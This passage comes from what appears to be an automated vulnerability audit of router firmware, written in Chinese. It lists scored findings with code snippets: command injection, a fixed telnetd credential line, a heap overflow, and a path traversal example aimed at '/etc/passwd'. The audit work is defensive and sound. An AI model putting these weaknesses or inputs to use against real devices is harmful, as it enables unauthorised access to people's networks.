- **备注:** 关联知识库记录：xml_output-$GETCFG_SVC-RUNTIME.CLIENTS.xml.php（相同漏洞模式）。跨文件污点链：HTTP输入(PFWD.NAT-1.xml.php)→$GETCFG_SVC→XML输出(当前文件)。需结合父框架验证参数来源，可在FIREWALL.xml.php等文件中寻找利用点

---
### command-execution-libservice-runservice

- **文件路径:** `htdocs/mydlink/libservice.php`
- **位置:** `libservice.php:8 runservice()`
- **类型:** command_execution
- **综合优先级分数:** **6.75**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 3.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** runservice($cmd)函数将参数$cmd直接拼接到服务命令中（'service '.$cmd.' &'），通过addevent/event机制执行。若$cmd源自未经验证的外部输入（如HTTP参数），攻击者可注入恶意命令实现RCE。触发条件：1) 调用runservice()的入口点暴露给攻击者（如web接口）2) $cmd包含未过滤的特殊字符（如; | $）。边界检查：当前文件未对$cmd进行任何过滤或转义。
- **代码片段:**
  ```
  function runservice($cmd)
  {
  	addevent("PHPSERVICE","service ".$cmd." &");
  	event("PHPSERVICE");
  }
  ```
- **关键词:** runservice, addevent, event, PHPSERVICE, service, $cmd
- **备注:** 需验证：1) event()函数是否最终执行命令（可能在C组件中）2) 调用runservice()的上游文件（如form_*.php）。关联线索：wand.php中存在通过'service'命令执行的漏洞（命令注入），但当前未发现$cmd与$svc的数据流关联。

---
### nvram_set-S52wlan.sh-devdata_injection

- **文件路径:** `etc/init0.d/S52wlan.sh`
- **位置:** `S52wlan.sh:48-50,89-94`
- **类型:** nvram_set
- **综合优先级分数:** **6.7**
- **风险等级:** 7.0
- **置信度:** 8.0
- **触发可能性:** 4.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** NVRAM参数注入：使用'devdata get'获取TXBFCAL值后未经验证直接注入nvram set命令。若devdata被劫持可污染无线校准参数。触发条件：PATH劫持或devdata二进制篡改。实际影响：无线模块异常/拒绝服务。
- **代码片段:**
  ```
  TXBFCAL=\`devdata get -e rpcal2g\`
  [ $TXBFCAL != "" ] && nvram set 0:rpcal2g=$TXBFCAL
  ```
- **关键词:** devdata get, TXBFCAL, nvram set, rpcal2g, rpcal5gb0
- **备注:** 需验证devdata命令完整性和返回值范围检查；关联知识库中'nvram set'污染传递链

---
### ipc_exposure-unnamed_path

- **文件路径:** `mydlink/signalc`
- **位置:** `signalc:0x123a8 (fcn.000123a8)`
- **类型:** ipc
- **综合优先级分数:** **6.7**
- **风险等级:** 6.0
- **置信度:** 9.0
- **触发可能性:** 5.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** IPC通道客户端实现暴露攻击面：固定使用路径'/tmp/evtr_ipc'发送32字节数据。虽客户端无直接漏洞，但若服务端存在缺陷（如缓冲区溢出），此通道可成为攻击入口。触发条件：1) 事件触发条件满足(uVar4 == 0x100 && uVar10 != 0) 2) 恶意服务端监听该路径。
- **关键词:** /tmp/evtr_ipc, fcn.000123a8, connect, send, uVar4, uVar10
- **备注:** 需在其他组件分析IPC服务端实现；当前知识库中无关联服务端漏洞记录

---
### heap_overflow-httpd-http_param

- **文件路径:** `sbin/httpd.c`
- **位置:** `httpd.c:unknown`
- **类型:** network_input
- **综合优先级分数:** **6.65**
- **风险等级:** 7.0
- **置信度:** 6.5
- **触发可能性:** 6.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 中危堆溢出漏洞：HTTP参数值直接用于sprintf格式化，当*(_DWORD*)(v6+3440)指向超长参数值时，可溢出堆缓冲区s。触发条件：发送特制HTTP请求包含超长参数值（>缓冲区分配大小）。影响：可能破坏堆元数据实现RCE。
- **关键词:** sprintf, *(_DWORD*)(v6+3440), HTTP_
- **备注:** 需后续验证：1) s缓冲区分配大小 2) 父函数中v6结构体定义

---
### command-injection-parameter-unfiltered

- **文件路径:** `mydlink/mydlink-watch-dog.sh`
- **位置:** `mydlink-watch-dog.sh:7-25`
- **类型:** command_execution
- **综合优先级分数:** **6.6**
- **风险等级:** 8.0
- **置信度:** 7.0
- **触发可能性:** 2.5
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 命令注入风险：$1参数未过滤直接用于grep/killall命令。触发条件：$1参数被污染且包含恶意命令。约束条件：当前仅发现opt.local传递固定参数'signalc'。潜在影响：若存在其他调用路径传递可控$1，可实现远程代码执行(RCE)。
- **代码片段:**
  ```
  pid=\`ps | grep /mydlink/$1 | grep -v grep | sed 's/^[ 	]*//'  | sed 's/ .*//' \`
  ```
- **关键词:** script_parameter, grep_command, killall_command, ps | grep, command_injection
- **备注:** 需全局搜索脚本调用点验证$1来源

---
### command_execution-dbg.run_program-0xfde0

- **文件路径:** `usr/bin/udevstart`
- **位置:** `dbg.run_program:0xfde0`
- **类型:** command_execution
- **综合优先级分数:** **6.55**
- **风险等级:** 7.5
- **置信度:** 6.0
- **触发可能性:** 5.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 在函数dbg.run_program(0xfde0)中发现execv调用，其参数argv[0]和argv[1]源自函数参数param_1。存在以下安全问题：1) param_1传播路径未完全解析，无法确认是否受环境变量、文件内容或外部输入影响；2) 未观察到对param_1的边界检查或过滤操作。潜在安全影响：若param_1被攻击者控制，可通过构造恶意路径实现任意代码执行。触发条件：dbg.run_program被调用且param_1包含攻击者可控数据。
- **关键词:** execv, argv, param_1, dbg.run_program
- **备注:** 证据局限：1) 静态分析工具无法完全追踪数据流 2) 未确认外部输入点与param_1的关联。关联线索：知识库中已有param_1相关的漏洞（mtools栈溢出、udevinfo环境变量溢出）。建议后续：1) 动态调试验证param_1实际值来源 2) 使用Ghidra进行深度数据流分析，特别关注与mtools/udevinfo的交互

---
### configuration_load-telnetd-hardcoded_credential

- **文件路径:** `etc/init0.d/S80telnetd.sh`
- **位置:** `S80telnetd.sh:10`
- **类型:** configuration_load
- **综合优先级分数:** **6.55**
- **风险等级:** 7.5
- **置信度:** 6.0
- **触发可能性:** 5.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 硬编码凭证风险：脚本使用'$image_sign'变量作为telnetd认证密码，该变量从/etc/config/image_sign文件读取。若该文件内容全局固定或可预测，攻击者可直接获取telnet访问权限。触发条件：1) S80telnetd.sh以'start'参数执行 2) orig_devconfsize=0（通过xmldbc获取） 3) /usr/sbin/login存在。实际影响取决于image_sign文件特性。
- **代码片段:**
  ```
  telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
  ```
- **关键词:** telnetd, image_sign, /etc/config/image_sign, orig_devconfsize, xmldbc -g /runtime/device/devconfsize
- **备注:** 关键限制：未验证/etc/config/image_sign文件内容。后续需：1) 分析该文件是否固件全局唯一 2) 检查固件更新机制是否修改此文件

---
### privilege_escalation-httpd_nvram_chain

- **文件路径:** `usr/sbin/nvram`
- **位置:** `usr/sbin/nvram: (全局权限设置)`
- **类型:** network_input
- **综合优先级分数:** **6.4**
- **风险等级:** 6.0
- **置信度:** 8.0
- **触发可能性:** 5.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** SUID权限风险：文件权限为'-rwxrwxrwx'未设SUID位，普通用户执行不提升权限。但若高权限服务(如root运行的httpd)调用存在漏洞的nvram，可形成特权升级链。触发条件：1) httpd等暴露网络接口 2) 调用nvram处理未净化的用户输入。实际影响：通过服务漏洞间接触发缓冲区越界或NVRAM污染。
- **关键词:** httpd, SUID, nvram_set, libnvram.so
- **备注:** 需验证httpd与nvram的交互。后续重点：分析www目录下的Web组件调用链

---
### attack_chain-CAfile_exploit

- **文件路径:** `usr/sbin/stunnel`
- **位置:** `跨组件攻击链：文件写入点 → stunnel:0x9a10 (fcn.0000977c)`
- **类型:** attack_chain
- **综合优先级分数:** **6.4**
- **风险等级:** 8.3
- **置信度:** 7.5
- **触发可能性:** N/A
- **查询相关性:** N/A
- **阶段:** N/A
- **描述:** 完整攻击链：攻击者通过文件写入漏洞（如Web接口上传/NVRAM配置覆盖）篡改CAfile配置文件内容 → 利用CAfile三重漏洞（缓冲区溢出/符号链接未解析/权限缺失） → 触发栈溢出或读取任意文件 → 实现远程代码执行。关键约束：依赖文件写入能力作为前置条件。
- **关键词:** CAfile, file_write, configuration_load, RCE_chain
- **备注:** 关联发现：attack_chain-writable_init_scripts（提供文件写入可能性） + config-CAfile-multi-vulns（漏洞触发点）

---
### configuration_load-path-validation

- **文件路径:** `etc/config/usbmount`
- **位置:** `etc/config/usbmount:1`
- **类型:** configuration_load
- **综合优先级分数:** **6.3**
- **风险等级:** 6.0
- **置信度:** 9.0
- **触发可能性:** 3.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 路径传递机制验证：'/var/tmp/storage'路径通过配置文件硬编码传递，未发现环境变量/NVRAM参数传递证据。约束条件：路径未进行边界检查或合法性验证。潜在风险：挂载恶意文件系统(如含SUID程序的镜像)可破坏系统完整性。触发条件：物理接触攻击(需控制USB设备内容)
- **代码片段:**
  ```
  挂载点路径配置：/var/tmp/storage
  ```
- **关键词:** /var/tmp/storage, mount

---
### service-deadlock-signalc-restart

- **文件路径:** `mydlink/mydlink-watch-dog.sh`
- **位置:** `mydlink-watch-dog.sh:11-13`
- **类型:** ipc
- **综合优先级分数:** **6.2**
- **风险等级:** 6.0
- **置信度:** 8.0
- **触发可能性:** 4.0
- **查询相关性:** 7.5
- **阶段:** N/A
- **描述:** 服务循环依赖漏洞：signalc进程异常触发opt.local重启，而opt.local又重启看门狗。触发条件：signalc进程崩溃后产生多个实例。安全影响：资源耗尽导致拒绝服务(DoS)。利用方式：攻击者故意崩溃signalc进程触发死循环。
- **关键词:** opt.local:start, signalc, /mydlink/opt.local stop, service_deadlock
- **备注:** 建议添加进程互斥锁机制

---
### file_read-dynamic_include-version_php

- **文件路径:** `htdocs/webinc/version.php`
- **位置:** `version.php:121,136,177`
- **类型:** file_read
- **综合优先级分数:** **6.2**
- **风险等级:** 6.0
- **置信度:** 8.0
- **触发可能性:** 4.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 动态加载机制：1) 条件加载version_3G.php(依赖文件存在) 2) 强制包含config.php/xnode.php。若攻击者能控制被包含文件(如通过文件上传漏洞)，可导致远程代码执行。触发条件：页面访问时自动执行include/dophp。
- **代码片段:**
  ```
  include "/htdocs/webinc/config.php";
  include "/htdocs/phplib/xnode.php";
  ```
- **关键词:** dophp("load"), isfile("/htdocs/webinc/body/version_3G.php"), include "/htdocs/webinc/config.php"
- **备注:** 需分析config.php/xnode.php是否存在危险函数

---
### nvram_set-S52wlan.sh-hardcoded_register

- **文件路径:** `etc/init0.d/S52wlan.sh`
- **位置:** `S52wlan.sh:全脚本多位置`
- **类型:** nvram_set
- **综合优先级分数:** **6.2**
- **风险等级:** 6.0
- **置信度:** 9.0
- **触发可能性:** 2.5
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 硬编码寄存器风险：43处nvram set直接配置无线芯片寄存器（如pa2ga0=0xFF29）。缺乏运行时验证，配合驱动漏洞可能被利用。触发条件：无线驱动存在安全缺陷。实际影响：绕过硬件限制或芯片故障。
- **关键词:** nvram set, 0:pa2ga0, 1:pa5ga0, 0:ledbh0, 1:sar5g
- **备注:** 需结合无线驱动逆向分析寄存器设置安全性；关联未分析服务PHYINF.WIFI（S52wlan.sh第98行调用）

---
### path_traversal-query_config-DEVICE.ACCOUNT.xml.php

- **文件路径:** `htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php`
- **位置:** `DEVICE.ACCOUNT.xml.php:6,7,16`
- **类型:** configuration_load
- **综合优先级分数:** **6.2**
- **风险等级:** 7.0
- **置信度:** 5.0
- **触发可能性:** 6.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** query()函数直接拼接NVRAM路径参数（如'/device/account/count'）未进行路径遍历检查。若底层getcfg.so未严格验证：1) 可通过路径遍历读取任意文件（如'../../../etc/passwd'）2) 注入恶意配置。触发条件：污染$GETCFG_SVC或修改调用参数控制路径字符串。边界检查：PHP层无任何目录边界控制。
- **代码片段:**
  ```
  echo "\t\t\t<seqno>".query("/device/account/seqno")."</seqno>\n";
  ```
- **关键词:** query, /device/account/count, get("x","uid"), /device/account/seqno
- **备注:** 关键制约：实际风险取决于usr/lib/php/extensions/getcfg.so的路径验证实现。关联知识库备注：'需验证XNODE_getpathbytarget()的安全实现'（相同验证需求）

---
### configuration_load-stunnel_cert-invalid_format

- **文件路径:** `etc/stunnel.conf`
- **位置:** `/etc/stunnel_cert.pem`
- **类型:** configuration_load
- **综合优先级分数:** **6.2**
- **风险等级:** 4.0
- **置信度:** 8.0
- **触发可能性:** 9.0
- **查询相关性:** 6.0
- **阶段:** N/A
- **描述:** 异常证书格式可能导致服务拒绝：/etc/stunnel_cert.pem缺少PEM文件头但包含X.509数据。触发条件：stunnel服务启动或重载配置时。边界检查：无证书格式验证机制。安全影响：可能造成服务初始化失败（拒绝服务），但无法直接导致权限提升或数据泄露。
- **关键词:** stunnel_cert.pem, cert
- **备注:** 需结合服务监控机制验证实际影响

---
### command_execution-rcS-subinit_call

- **文件路径:** `etc/init.d/rcS`
- **位置:** `etc/init.d/rcS:6 (global_scope) 0x0`
- **类型:** command_execution
- **综合优先级分数:** **6.15**
- **风险等级:** 6.5
- **置信度:** 8.0
- **触发可能性:** 2.5
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 显式调用下级初始化脚本/etc/init0.d/rcS，存在未验证脚本执行风险。触发条件：主循环结束后自动执行。安全影响：若攻击者控制init0.d/rcS，可在系统初始化最后阶段执行任意命令。
- **代码片段:**
  ```
  /etc/init0.d/rcS
  ```
- **关键词:** /etc/init0.d/rcS
- **备注:** 关联验证点：/etc/init0.d/rcS内容及目录权限 - 关联自 etc/init.d/rcS:6

---
### network_input-httpd-rangeheader-0x1acc4

- **文件路径:** `sbin/httpd`
- **位置:** `sbin/httpd:0x1acc4`
- **类型:** network_input
- **综合优先级分数:** **6.1**
- **风险等级:** 5.0
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** struct_offset_0xf48字段通过strtoull从'Range'头转换64位值，缺乏边界验证可能引发下游整数溢出风险。触发条件：特制Range头值。
- **代码片段:**
  ```
  *(param_1 + 0xf48) = strtoull(...)
  ```
- **关键词:** strtoull, Range, 0xf48, fcn.0001acc4

---
### http_input-service_type_validation-PFWD.NAT-1.xml.php

- **文件路径:** `htdocs/webinc/getcfg/PFWD.NAT-1.xml.php`
- **位置:** `PFWD.NAT-1.xml.php:8-18`
- **类型:** network_input
- **综合优先级分数:** **6.1**
- **风险等级:** 5.0
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 动态XML生成机制依赖$GETCFG_SVC前缀(PFWD/VSVR/PORTT/DMZ)决定输出结构，但未验证服务类型有效性。触发条件：攻击者提交非法服务类型前缀(如'INVALID')。约束检查缺失：无默认处理分支或类型白名单校验。潜在影响：1) 未定义$target变量导致PHP报错泄露路径信息 2) 异常逻辑路径可能绕过正常访问控制。实际风险取决于错误处理配置，在display_errors开启时可形成信息泄露漏洞。
- **代码片段:**
  ```
  if ($svc == "PFWD") $target = "portforward";
  else if ($svc == "VSVR") $target = "virtualserver";
  ```
- **关键词:** $svc, $target, PFWD, VSVR, PORTT, DMZ
- **备注:** 风险程度受php.ini配置影响。关联知识库关键词：$svc, $target。需追踪$target变量在XML生成后的传播路径

---
### configuration_load-telnetd-suid_assessment

- **文件路径:** `usr/sbin/telnetd`
- **位置:** `bin/telnetd (文件属性)`
- **类型:** configuration_load
- **综合优先级分数:** **5.84**
- **风险等级:** 3.0
- **置信度:** 9.8
- **触发可能性:** 7.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** SUID权限影响评估：telnetd文件权限为-rwxrwxrwx，未设置SUID位。程序执行时以调用者权限运行，不会提权。结合已知漏洞（如环境变量触发的栈溢出），攻击者仅能获得当前用户权限（如www-data），无法直接获取root权限。
- **关键词:** telnetd权限位, sub_40d6f8, 环境变量
- **备注:** 需检查系统提权路径（如sudo配置）。无SUID使telnetd漏洞降为中危

---
### mount-options-mask-validation

- **文件路径:** `sbin/ntfs-3g`
- **位置:** `sbin/ntfs-3g:0x106a0`
- **类型:** configuration_load
- **综合优先级分数:** **5.6**
- **风险等级:** 5.0
- **置信度:** 7.0
- **触发可能性:** 5.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 挂载选项处理逻辑（如umask/fmask/dmask）通过sscanf直接解析用户输入为整数，未进行数值范围校验。攻击者可通过命令行参数设置异常值（如>0777的权限掩码）。触发条件：攻击者能控制mount命令参数。安全影响：可能导致文件权限设置错误或触发内核驱动未定义行为，但具体危害需结合内核实现验证。
- **关键词:** umask, fmask, dmask, sscanf, getopt_long, parse_mount_options, fcn.0000a308, fcn.0000a35c
- **备注:** 建议后续分析内核NTFS驱动对异常掩码值的处理逻辑。

---
### command_injection-servd_command-0x9b10

- **文件路径:** `usr/sbin/servd`
- **位置:** `usr/sbin/servd:0x9b10 (fcn.00009b10)`
- **类型:** command_execution
- **综合优先级分数:** **5.55**
- **风险等级:** 6.5
- **置信度:** 5.0
- **触发可能性:** 4.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 潜在命令注入风险：system调用参数(param_1)通过sprintf动态构造，数据源自链表节点偏移0x10字段。触发条件：若攻击者能污染链表节点数据（如通过未授权IPC操作），可注入任意命令。当前证据不足确认外部可控性，但代码结构存在风险模式。
- **关键词:** fcn.00009b10, fcn.0000f09c, piVar6[-2], *(piVar6[-4] + 0x10), *(piVar6[-3] + 0x10), auStack_11c, sprintf, system
- **备注:** 后续建议：1) 分析svchlper等关联进程 2) 追踪链表节点创建函数

---
### command_injection-servd_command-0x9b10_update

- **文件路径:** `usr/sbin/servd`
- **位置:** `usr/sbin/servd:0x9b10 (fcn.00009b10)`
- **类型:** command_execution
- **综合优先级分数:** **5.55**
- **风险等级:** 6.5
- **置信度:** 5.0
- **触发可能性:** 4.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 潜在命令注入风险：system调用参数(param_1)通过sprintf动态构造，数据源自链表节点偏移0x10字段。触发条件：若攻击者能污染链表节点数据（如通过未授权IPC操作），可注入任意命令。当前证据不足确认外部可控性，但代码结构存在风险模式。
- **代码片段:**
  ```
  sprintf(auStack_11c, "apply_cfg %s", *(piVar6[-4] + 0x10));
  system(auStack_11c);
  ```
- **关键词:** fcn.00009b10, fcn.0000f09c, piVar6[-2], *(piVar6[-4] + 0x10), *(piVar6[-3] + 0x10), auStack_11c, sprintf, system
- **备注:** 后续建议：1) 分析svchlper等关联进程 2) 追踪链表节点创建函数

---
### path-traversal-fatlady-prefix

- **文件路径:** `htdocs/webinc/fatlady.php`
- **位置:** `fatlady.php:14-15`
- **类型:** network_input
- **综合优先级分数:** **5.45**
- **风险等级:** 6.0
- **置信度:** 5.5
- **触发可能性:** 4.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 动态变量拼接风险。$FATLADY_prefix由'$prefix./runtime/fatlady_'和$InDeX拼接而成，$InDeX来源未明。若$InDeX可控（如来自HTTP参数），可能通过路径遍历（如'../'）突破目录限制。未见长度校验或特殊字符过滤。
- **关键词:** $FATLADY_prefix, $InDeX, $prefix, runtime/fatlady_

---
### network_framework-httpd-request_handler

- **文件路径:** `sbin/httpd.c`
- **位置:** `httpd.c:3471,7628,7668`
- **类型:** network_input
- **综合优先级分数:** **5.4**
- **风险等级:** 6.0
- **置信度:** 8.0
- **触发可能性:** N/A
- **查询相关性:** 7.5
- **阶段:** N/A
- **描述:** 网络请求处理基础框架：确认HTTP请求通过read()写入固定大小缓冲区(a1+204)，URL长度限制400字节（行7668）。风险点：1) 缓冲区分配大小未验证；2) 方法处理逻辑缺乏过滤。
- **关键词:** read, a1+204, sub_163B0, URL

---
### network_input-http_header_parser-7600

- **文件路径:** `sbin/httpd.c`
- **位置:** `httpd.c:7600, httpd.c:7925`
- **类型:** network_input
- **综合优先级分数:** **5.3**
- **风险等级:** 3.0
- **置信度:** 8.0
- **触发可能性:** 7.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 参数解析函数(parse_http_version, parse_expect_header)存在边界检查机制。触发条件：接收非法HTTP头时返回400/417错误（行7600,7925）。安全影响：严格错误处理防止缓冲区溢出，但仅导致服务拒绝，无可利用命令执行路径。
- **关键词:** parse_http_version, parse_expect_header, sub_14604

---
### ipc_spoofing-servd_ipc-0xa030

- **文件路径:** `usr/sbin/servd`
- **位置:** `usr/sbin/servd:0xa030 (fcn.0000a030)`
- **类型:** ipc
- **综合优先级分数:** **5.1**
- **风险等级:** 4.0
- **置信度:** 7.0
- **触发可能性:** 5.0
- **查询相关性:** 6.0
- **阶段:** N/A
- **描述:** IPC请求伪造风险：外部可控的param_2参数在fcn.0000a030中拼接后，经fcn.000148a8发送或通过fputc写入全局文件流。触发条件：满足魔数校验(0x5c5c71e7/0x5c50c3e7)且数据≤512字节。可导致内部服务欺骗或日志注入，但无直接内存破坏证据。
- **关键词:** fcn.0000a030, param_2, auStack_21c, fcn.000148a8, fcn.00014970, sym.imp.fputc, *(0xf2e0|0x10000), 0x5c5c71e7, 0x5c50c3e7
- **备注:** 需验证文件流目标是否敏感（如认证日志）

---
### network_input-httpd_service_start-5608

- **文件路径:** `sbin/httpd.c`
- **位置:** `httpd.c:5608, httpd.c:5664`
- **类型:** network_input
- **综合优先级分数:** **5.1**
- **风险等级:** 2.0
- **置信度:** 7.0
- **触发可能性:** 10.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** HTTP服务启动逻辑存在但入口函数未明确定位。触发条件：固件启动时执行httpd服务。边界检查：通过bind()和listen()系统调用建立服务（行5608,5664），但未发现请求分发核心函数。安全影响：无直接漏洞，但入口模糊可能隐藏潜在路由漏洞，需结合CGI分析。
- **关键词:** bind, listen, v3
- **备注:** 关键限制：反编译丢失符号导致无法定位httpd_main等关键函数

---
### ConfigurationLoad-PathValidation-FormWansetting

- **文件路径:** `htdocs/mydlink/form_wansetting`
- **位置:** `firmware_root/`
- **类型:** configuration_load
- **综合优先级分数:** **5.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 10.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 文件路径验证失败：目标文件 'htdocs/mydlink/form_wansetting' 不存在，其父目录 'htdocs/mydlink/' 也不存在。触发条件为尝试访问该路径时。此问题导致无法进行任何与文件内容相关的安全分析（如输入处理验证、危险函数检测等），直接影响对WAN设置相关攻击面的评估。该缺陷阻碍了用户核心需求中要求的完整攻击链分析（从网络输入到危险操作），特别是涉及WAN配置的潜在漏洞链。
- **代码片段:**
  ```
  N/A (文件不存在)
  ```
- **关键词:** form_wansetting, htdocs/mydlink
- **备注:** 关键影响：阻碍WAN设置攻击面分析。建议操作：1) 确认文件路径正确性；2) 检查固件解压完整性；3) 分析同目录其他文件（如存在'htdocs'目录）；4) 若路径错误，需修正后重新分析。关联提示：知识库中多个notes建议重点分析HTTP组件（如/sbin/httpd），可优先转向其他攻击面。

---
### env_set-version-declaration

- **文件路径:** `mydlink/version`
- **位置:** `mydlink/version:1`
- **类型:** env_set
- **综合优先级分数:** **4.9**
- **风险等级:** 3.0
- **置信度:** 10.0
- **触发可能性:** 2.0
- **查询相关性:** 7.5
- **阶段:** N/A
- **描述:** 文件包含固件版本环境变量声明'VERSION=2.0.18-b10'。该变量可能在系统启动时被加载到环境变量空间，供其他程序通过getenv()调用获取版本信息。主要风险在于：1) 攻击者可利用该特定版本号关联公开漏洞库（如CVE）寻找已知漏洞 2) 若程序未对版本字符串进行边界检查，可能造成信息泄漏或缓冲区溢出（实际风险取决于具体调用点）。触发条件为：任何读取环境变量$VERSION的程序存在不安全操作。
- **代码片段:**
  ```
  VERSION=2.0.18-b10
  ```
- **关键词:** VERSION, env_get
- **备注:** 需后续追踪$VERSION在系统中的使用位置（如grep -r 'getenv("VERSION")'），验证数据流是否经过危险函数。版本'b10'可能表示测试版本，需关注开发遗留后门。关联知识库中现有getenv漏洞模式：stack_overflow-http_handler-remote_addr（REMOTE_ADDR栈溢出）、command_injection-http_processor-content_type（命令注入）

---
### env_set-PATH_modification-append_mydlink

- **文件路径:** `etc/profile`
- **位置:** `etc/profile:1`
- **类型:** env_set
- **综合优先级分数:** **4.6**
- **风险等级:** 2.0
- **置信度:** 10.0
- **触发可能性:** 3.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 文件仅修改PATH环境变量，追加/mydlink目录到搜索路径。若该目录存在攻击者可控的可执行文件（如通过文件上传漏洞写入），当系统执行未指定路径的命令时可能触发命令劫持。触发需满足：1) /mydlink目录权限设置不当（如全局可写）2) 系统执行PATH搜索范围内的命令。边界检查缺失点：未验证/mydlink目录下文件的完整性和来源。
- **代码片段:**
  ```
  PATH=$PATH:/mydlink
  ```
- **关键词:** PATH, /mydlink
- **备注:** 需后续验证：1) /mydlink目录权限（如find /mydlink -perm -o+w）2) 该目录下可执行文件清单 3) 调用PATH搜索的命令（如system/popen调用）

---
### buffer_truncation-sysfs_attr-512B

- **文件路径:** `sbin/udevtrigger`
- **位置:** `udevtrigger: sysfs_attr_get_value@0xa5f4`
- **类型:** hardware_input
- **综合优先级分数:** **4.5**
- **风险等级:** 2.0
- **置信度:** 9.0
- **触发可能性:** 4.0
- **查询相关性:** 6.0
- **阶段:** N/A
- **描述:** 固定大小缓冲区截断风险。触发条件：当外部输入（设备路径/属性名）长度超过缓冲区限制（路径buf=512B，属性值buf=128B）时发生截断。虽使用strlcpy/strlcat防止溢出，但可能造成功能异常。安全影响有限，无直接内存破坏风险。
- **关键词:** strlcpy, strlcat, 0x200, 0x80, devpath, attr_name, sysfs_attr_get_value
- **备注:** 需评估超长路径在实际设备中的可行性

---
### command_execution-signalc_termination

- **文件路径:** `mydlink/opt.local`
- **位置:** `opt.local:11-18 (stop), 26-33 (restart)`
- **类型:** command_execution
- **综合优先级分数:** **4.4**
- **风险等级:** 3.0
- **置信度:** 9.0
- **触发可能性:** 1.0
- **查询相关性:** 6.5
- **阶段:** N/A
- **描述:** 服务停止操作使用 `killall -9` 强制终止进程：
- 触发条件：执行脚本的 stop/restart 功能时触发
- 边界检查：无状态保存或恢复机制，直接强制终止
- 安全影响：可能导致服务状态不一致，但无直接可利用路径
- 利用方式：目前无证据表明可被外部输入触发
- **代码片段:**
  ```
  killall -9 signalc
  killall -9 tsa
  ```
- **关键词:** killall -9, signalc, tsa, stop, restart
- **备注:** 需结合服务实现分析状态不一致的实际影响

---
### configuration_load-internal_state-version_php

- **文件路径:** `htdocs/webinc/version.php`
- **位置:** `version.php:6,112`
- **类型:** configuration_load
- **综合优先级分数:** **4.3**
- **风险等级:** 2.5
- **置信度:** 9.5
- **触发可能性:** 1.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 未发现直接受外部输入影响的变量。数据源均来自：1) 固定配置文件(/etc/config/) 2) 运行时状态(/runtime/) 3) 硬编码字符串。JavaScript变量由PHP生成，PHP数据源均为内部状态。
- **代码片段:**
  ```
  var langcode = "<?echo query("/runtime/device/langcode");?>;";
  ```
- **关键词:** query("/runtime/device/langcode"), cut(fread("", "/etc/config/buildrev"))
- **备注:** 建议后续分析query()函数实现位置

---
### command_execution-etc_init.d_S20init.sh-dbload_script

- **文件路径:** `etc/init.d/S20init.sh`
- **位置:** `etc/init.d/S20init.sh:6`
- **类型:** command_execution
- **综合优先级分数:** **4.3**
- **风险等级:** 5.0
- **置信度:** 6.0
- **触发可能性:** N/A
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 脚本直接调用/etc/scripts/dbload.sh且未传递参数。虽然当前未发现数据污染迹象，但若dbload.sh处理外部可控数据（如环境变量或配置文件），可能成为攻击链环节。触发条件：dbload.sh存在未验证输入源且被污染。
- **代码片段:**
  ```
  /etc/scripts/dbload.sh
  ```
- **关键词:** dbload.sh
- **备注:** 建议后续分析dbload.sh是否处理NVRAM/网络输入

---
### command_execution-tsa-static_popen

- **文件路径:** `mydlink/tsa`
- **位置:** `tsa:0x13b50`
- **类型:** command_execution
- **综合优先级分数:** **4.3**
- **风险等级:** 2.0
- **置信度:** 9.0
- **触发可能性:** 3.0
- **查询相关性:** 7.5
- **阶段:** N/A
- **描述:** 固定命令执行无注入风险：popen调用(0x13b50)执行静态命令'mdb get admin_passwd'，参数来自.rodata(0x190bc)，无外部输入污染。函数仅过滤输出控制字符，无命令注入可能。
- **关键词:** popen, mdb, admin_passwd, static_command, 0x190bc
- **备注:** 关联知识库关键词：popen, admin_passwd

---
### input-validation-libservice-getvalidmac

- **文件路径:** `htdocs/mydlink/libservice.php`
- **位置:** `libservice.php:15 get_valid_mac()`
- **类型:** network_input
- **综合优先级分数:** **4.2**
- **风险等级:** 4.0
- **置信度:** 6.0
- **触发可能性:** 2.0
- **查询相关性:** 6.0
- **阶段:** N/A
- **描述:** get_valid_mac($value)处理MAC地址格式化但未展示验证逻辑。若$value来自外部输入且未经验证（如长度/字符集），可能被用于命令注入或缓冲区溢出。触发条件：该函数被调用于处理网络传入的MAC参数时。边界检查：函数未显示对$value的校验代码。
- **关键词:** get_valid_mac, $value, mac_str, MAC
- **备注:** 需确认：1) $value来源是否外部可控 2) MAC处理逻辑是否涉及底层系统调用

---
### undefined-function-DEVICE.LOG.xml.php-5

- **文件路径:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php`
- **位置:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php:5`
- **类型:** configuration_load
- **综合优先级分数:** **4.1**
- **风险等级:** 3.0
- **置信度:** 8.0
- **触发可能性:** 1.0
- **查询相关性:** 6.0
- **阶段:** N/A
